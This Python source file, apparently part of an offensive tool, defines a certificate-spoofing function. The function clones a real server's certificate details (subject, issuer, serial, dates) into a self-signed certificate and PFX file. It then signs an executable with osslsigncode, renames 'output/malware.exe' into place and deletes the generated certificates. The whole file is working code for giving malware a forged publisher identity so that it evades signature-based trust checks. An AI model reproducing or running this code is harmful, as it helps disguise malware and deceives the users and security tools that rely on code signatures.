from lib import core
from OpenSSL import crypto
from pathlib import Path
from ssl import get_server_certificate
from subprocess import call, PIPE
from os import system

TIMESTAMP_URL = "http://sha256timestamp.ws.symantec.com/sha256/timestamp"


def spoofer(host, port, filename, out):
    try:
        ogcert = get_server_certificate((host, int(port)))
        x509 = crypto.load_certificate(crypto.FILETYPE_PEM, ogcert)

        certDir = Path('certs')
        certDir.mkdir(exist_ok=True)

        # Creating Fake Certificate
        CNCRT = certDir / (host + ".crt")
        CNKEY = certDir / (host + ".key")
        PFXFILE = certDir / (host + ".pfx")

        # Creating Keygen
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, ((x509.get_pubkey()).bits()))
        cert = crypto.X509()

        # Setting Cert details from loaded from the original Certificate
        cert.set_version(x509.get_version())
        cert.set_serial_number(x509.get_serial_number())
        cert.set_subject(x509.get_subject())
        cert.set_issuer(x509.get_issuer())
        cert.set_notBefore(x509.get_notBefore())
        cert.set_notAfter(x509.get_notAfter())
        cert.set_pubkey(k)
        cert.sign(k, 'sha256')

        CNCRT.write_bytes(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        CNKEY.write_bytes(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))

        try:
            pfx = crypto.PKCS12()
        except AttributeError:
            pfx = crypto.PKCS12Type()

        pfx.set_privatekey(k)
        pfx.set_certificate(cert)
        pfxdata = pfx.export()

        PFXFILE.write_bytes(pfxdata)

        args = ("osslsigncode", "sign", "-pkcs12", PFXFILE, "-n", core.varname_creator(), "-i", TIMESTAMP_URL, "-in", filename, "-out", out)
        call(args, stdout=PIPE)
        core.exe_signed()
        system(f"mv output/malware.exe {filename} && rm -rf certs/")


    except Exception as ex:
        print("[X] Something Went Wrong!\n[X] Exception: " + str(ex))
